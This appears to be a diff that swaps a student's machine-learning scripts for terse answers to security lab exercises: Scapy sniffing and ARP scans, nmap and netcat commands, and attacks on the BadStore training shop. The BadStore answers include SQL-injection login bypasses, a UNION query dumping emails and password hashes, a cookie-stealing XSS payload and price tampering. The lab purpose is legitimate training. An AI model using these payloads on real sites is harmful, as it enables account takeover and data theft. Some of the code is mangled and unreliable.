@@ -1,134 +1,142 @@
-import numpy as np
-import matplotlib.pyplot as plt
-from sklearn import datasets
-from sklearn.preprocessing import StandardScaler
-from sklearn.decomposition import PCA
-iris = datasets.load_iris()
-X = iris.data
-y = iris.target
-target_names = iris.target_names
-print("Original Shape:", X.shape)
-scaler = StandardScaler()
-X_std = scaler.fit_transform(X)
-cov_matrix = np.cov(X_std.T)
-print("\nCovariance Matrix:\n", cov_matrix)
-eigenvalues, eigenvectors = np.linalg.eig(cov_matrix)
-print("\nEigenvalues:\n", eigenvalues)
-print("\nEigenvectors:\n", eigenvectors)
-sorted_index = np.argsort(eigenvalues)[::-1]
-sorted_eigenvalues = eigenvalues[sorted_index]
-sorted_eigenvectors = eigenvectors[:, sorted_index]
-print("\nSorted Eigenvalues:\n", sorted_eigenvalues)
-n_components = 2
-eigenvector_subset = sorted_eigenvectors[:, :n_components]
-X_manual = np.dot(X_std, eigenvector_subset)
-print("\nReduced Shape (Manual PCA):", X_manual.shape)
-pca = PCA(n_components=2)
-X_sklearn = pca.fit_transform(X_std)
-print("\nReduced Shape (Sklearn PCA):", X_sklearn.shape)
-print("\nExplained Variance Ratio (Sklearn):", pca.explained_variance_ratio_)
-plt.figure(figsize=(12,5))
-plt.subplot(1,2,1)
-for i in range(3):
-    plt.scatter(X_manual[y == i, 0],X_manual[y == i, 1],label=target_names[i])
-plt.xlabel("Principal Component 1")
-plt.ylabel("Principal Component 2")
-plt.title("Manual PCA")
-plt.legend()
-plt.subplot(1,2,2)
-for i in range(3):
-    plt.scatter(X_sklearn[y == i, 0],X_sklearn[y == i, 1],label=target_names[i])
-plt.xlabel("Principal Component 1")
-plt.ylabel("Principal Component 2")
-plt.title("Sklearn PCA")
-plt.legend()
-plt.show()
-__________________________________________________________________________
-import numpy as np
-from sklearn import datasets
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.neighbors import KNeighborsClassifier
-from sklearn.metrics import accuracy_score, confusion_matrix
-wine = datasets.load_wine()
-X = wine.data
-y = wine.target
-print("Dataset Shape:", X.shape)
-print("Classes:", wine.target_names)
-X_train, X_test, y_train, y_test = train_test_split(
-    X, y, test_size=0.2, random_state=42
-)
-scaler = StandardScaler()
-X_train = scaler.fit_transform(X_train)
-X_test = scaler.transform(X_test)
-knn = KNeighborsClassifier(n_neighbors=5)
-knn.fit(X_train, y_train)
-y_pred = knn.predict(X_test)
-print("\nAccuracy:", accuracy_score(y_test, y_pred))
-print("\nConfusion Matrix:\n", confusion_matrix(y_test, y_pred))
-______________________________________________________________________
-import numpy as np
-import matplotlib.pyplot as plt
-from PIL import Image
-img = Image.open(r"C:\Users\sbrac_j1qy6j5\OneDrive\Desktop\myimage.jpg").convert('L')
-A = np.array(img)
-U, S, Vt = np.linalg.svd(A, False)
-def rec(k):
-    return U[:, :k] @ np.diag(S[:k]) @ Vt[:k, :]
-imgs = [A, rec(5), rec(20), rec(50)]
-title = ['Original', 'k=5', 'k=20', 'k=50']
-for i in range(4):
-    plt.subplot(2, 2, i+1)
-    plt.imshow(imgs[i], cmap="gray")
-    plt.title(title[i])
-    plt.axis('off')
-plt.show()
-print("original:", A.size)
-for k in [5, 20, 50]:
-    print(f"k={k}", U[:, :k].size + S[:k].size + Vt[:k, :].size)
+1 a. go to badstore , ifconfig note ip address and open from seed lab that ip 
+login: admin' -- , what's new = select item add to cart , in space bar inspect q . View cart , There see the storage see view CartID = change the price and again view cart the price will be changed .
 ________________________________________________________________________
-from sklearn.datasets import load_digits
-from sklearn.model_selection import train_test_split
-from sklearn.tree import DecisionTreeClassifier, plot_tree
-from sklearn.metrics import accuracy_score, confusion_matrix
-import matplotlib.pyplot as plt
-digits = load_digits()
-X = digits.data
-y = digits.target
-X_train, X_test, y_train, y_test = train_test_split(
-    X, y, test_size=0.3, random_state=42
-)
-model = DecisionTreeClassifier(random_state=42)
-model.fit(X_train, y_train)
-y_pred = model.predict(X_test)
-accuracy = accuracy_score(y_test, y_pred)
-cm = confusion_matrix(y_test, y_pred)
-print("Accuracy:", accuracy)
-print("\nConfusion Matrix:\n", cm)
-plt.figure(figsize=(15,8))
-plot_tree(model, filled=True, fontsize=6)
-plt.title("Decision Tree Visualization")
-plt.show()
-_________________________________________________________________________
-# Import required libraries
-import pandas as pd
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.ensemble import RandomForestClassifier
-from sklearn.metrics import accuracy_score, confusion_matrix, classification_report
-df = pd.read_csv(r"C:\Users\sbrac_j1qy6j5\OneDrive\Desktop\diabetes.csv")
-X = df.iloc[:, :-1]
-y = df.iloc[:, -1]
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
-scaler = StandardScaler()
-X_train = scaler.fit_transform(X_train)
-X_test = scaler.transform(X_test)
-model = RandomForestClassifier()
-model.fit(X_train, y_train)
-y_pred = model.predict(X_test)
-print("Accuracy:", accuracy_score(y_test, y_pred))
-print("\nConfusion Matrix:\n", confusion_matrix(y_test, y_pred))
-print("\nClassification Report:\n", classification_report(y_test, y_pred))
+from scapy.all import *
+packet=IP()/TCP()                1(b)
+e_pack=Ether()/packet
+e_pack.show()
+____________________
+1(c) nano port_scan.sh
+#!/bin/bash
+echo "Enter the target Ip"
+read target
+echo "Enter start port:"
+read start
+echo "Enter end port"
+read end
+echo "Scanning the ports from $start to $end on $target"
+for((port=$start ; port<= $end ; port++))
+do 
+        nc -z -w 1 $target $port 2>/dev/null
+        if[$ ? -eq 0]; then
+                echo "port $port is open"
+          fi
+done
+echo "Scan completed"
+>> chmod +x port_scan.sh
+>> ./port_scan.sh
+_____________________________________________________
+2 a. open badstore
+login as joe@supplier.com '--
+view previous order see the card used 
+______________________________________________
+2 c . nc -l -p 1234(one terminal) 
+         nc 127.0.0.1 1234 (another terminal)
+__________________________________________________
+from scapy.all import *
+packets=sniff(count=10)            2(b)
+packets.summary()
+print(packets[0].show())
+print(packets[1].show())
+_______________________________________________________________
+from scapy.all import *
+result,unanswered=traceroute([&quot;www.example.com&quot;,&quot;www.google.com&quot;],maxttl=20)              3(a)
+result.show()
+____________________________________________________________
+3 b) >> nc www.google.com 80
+ type : HEAD/HTTP/1.1
+             Host:www.google.com
+         >>nc www.google.com 80
+type:    GET/HTTP/1.1
+              Host:www.google.com
+_______________________________________________________
+3 c. >>nmap -sn 192.168.0.1/24 , >>nmap -sn 192.168.0.1
+________________________________________________________
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = &quot;192.168.1.1/28&quot;
+broadcast = scapy.Ether()                                    4(a)
+broadcast.dst = &quot;ff:ff:ff:ff:ff:ff&quot;
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout=2)[0]
+for element in clients:
+print(element[1].psrc + &quot; - &quot; + element[1].hwsrc)
+___________________________________________________________
+4b) >> nc -l -p 4000 / open in browser localhost:4000
+type : HTTP/1.1 200 OK
+            Content-Type- text/plain
+            Hi everyone
+__________________________________________________________
+4 c. >> nmap 192.168.1.100-20 , >>nmap 192.168.1.0/24
+___________________________________________________________
+5 a) login : admin '--
+        what'new select one item add to cart ,in search bar right click inspect
+delete maxlenght , <script>alert(document.cookie)</script> cart id is displayed
+______________________________________________________________
+5b - 1c
+____________________________
+5c, nmap 192.168.1.1 >> nmap -sV 192.168.1.1
+____________________________________
+6a - 5a
+________________________________________________________________ 
+6b ) >>nmap -O 192.168.1.1 , >>nmap -A 192.168.1.1
+___________________________________________________
+6 c) login: admin '--, what'new : select one item -> add items, go to search bar right click inspect , delete maxlenght , again go type 
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 --
+two is displayed : select hash from admin in browser MD5 reverse again note that password login with that password , in above url change action =login to action=admin
+in view add user:- right click view page source html , hidden
+___________________________________________
+from scapy.all import *
+packet=IP(dst=&quot;8.8.8.8&quot;)/ICMP()  --7(a)
+send(packet)
+________________________________________________________________
+7b) >> nc -l -p 5000 , localhost:5000
+HTTP/1.1 200 OK
+Content-type- text/html; charset=UTF-8
+Server:nooblinux
+</doctype html>
+<title>kushi</title>
+<img src="">
+_____________________________________________
+7c) login:admin '-- , what's new select one item , add to csrt, go to search bar : right click inspect maxlenght - delete , type in search bar
+x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from
+itemdb --
+one box is displayed
+___________________________________________
+from scapy.all import *
+target = &quot;www.example.com&quot;
+for port in range(20, 25):
+packet = IP(dst=target) / TCP(dport=port, flags=&quot;S&quot;)
+response = sr1(packet, timeout=1, verbose=0)             8(a)
+if response:
+print(&quot;Port&quot;, port, &quot;is open&quot;)      
+_________________________________________________________
+8(b) >>nmap --script vuln 192.168.1.1 , >>nmap -ON"E:\\output.txt" 192.168.1.1
+_____________________________________________________
+8(c) go supplier login: joe@supplier.com '--
+____________________________________________
+9a-7b, 9b-4c,9c-2a
+____________________________________
+ from scapy.all import *         10(a)
+def callback(packet):
+if packet.haslayer(ICMP):
+print(&quot;ICMP Packet Detected&quot;)
+packet.show()
+sniff(filter=&quot;icmp&quot;, prn=callback, count=10) 
+______________________________
+10b-5c
+__________________
+10.c) login:-admin '--,password ; secret
+above url action=admin , show current users 
+_____________________________________________
+11 a - 4a,11b-7b,11c-5a
+______________________________
+from scapy.all import *
+result,unanswered=traceroute([&quot;www.example.com&quot;,&quot;www.google.com&quot;],maxtt
+l=20)      12(a)
+result.show()
+___________________________________
+12.b = 7b, 12 c= 5a
 
 
 
